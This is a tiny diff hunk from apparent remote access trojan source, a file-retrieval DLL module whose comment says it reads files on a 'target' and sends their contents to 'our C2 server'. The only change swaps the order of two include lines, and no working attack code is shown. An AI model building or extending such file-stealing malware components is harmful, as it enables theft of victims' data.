@@ -2,8 +2,8 @@
 // Verison 1.0.
 // RAT-Dll-GetFile.cpp : Defines functionality for performing a file get on target, i.e., retrieving a buffer of file contents and sending it back to our C2 server
 
-#include "RAT-Dll-GetFile.h"
 #include "RAT-Dll-Connect.h"
+#include "RAT-Dll-GetFile.h"
 
 /*TODO: Add ability to start at offset within file
 		Add ability to chunk data we send back
